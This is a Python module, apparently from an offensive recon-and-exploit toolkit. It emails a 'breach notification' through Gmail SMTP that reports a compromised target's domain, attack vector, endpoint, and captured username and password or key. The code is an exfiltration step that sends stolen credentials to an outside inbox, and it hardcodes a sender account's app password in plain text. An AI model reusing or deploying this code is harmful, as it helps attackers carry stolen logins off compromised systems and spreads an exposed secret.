import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_breach_alert(target, hit_details):
    """
    Transmits an encrypted SMTP alert directly to your inbox 
    using your verified app password.
    """
    smtp_server = "smtp.gmail.com"
    port = 465
    sender_email = "blessedresult6@gmail.com"
    receiver_email = "dennisbed1234@gmail.com"
    
    # Strip spaces just in case, though Python handles them fine
    app_password = "tsalstxozskojkvc"  # Spaces removed or kept both work

    print(f"\n\033[95m[mail.py] Initializing SMTP TLS connection to {smtp_server}:{port}...\033[0m")

    message = MIMEMultipart("alternative")
    message["Subject"] = f"[+++] RED TEAM ALERT: Target Compromised -> {target}"
    message["From"] = sender_email
    message["To"] = receiver_email

    text = f"""
[NEURAL RECON & EXPLOIT ENGINE - AUTOMATED BREACH NOTIFICATION]

Target Domain : {target}
Vector Type   : {hit_details.get('type', 'N/A')}
Endpoint      : {hit_details.get('endpoint', 'N/A')}
Target Port   : {hit_details.get('port', 'N/A')}
Username      : {hit_details.get('user', 'N/A')}
Password/Key  : {hit_details.get('password', 'N/A')}
Status Code   : {hit_details.get('status', 'N/A')}
Timestamp     : {hit_details.get('timestamp', 'N/A')}

Artifacts have been safely dumped to reports/ locally on mobile terminal.
"""

    message.attach(MIMEText(text, "plain"))

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, app_password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        
        print(f"\033[92m[+] SUCCESS: Breach notification email dispatched to {receiver_email}!\033[0m")
        return True, "Alert sent successfully."
        
    except Exception as e:
        print(f"\033[91m[!] SMTP ERROR: Failed to send email: {e}\033[0m")
        return False, str(e)
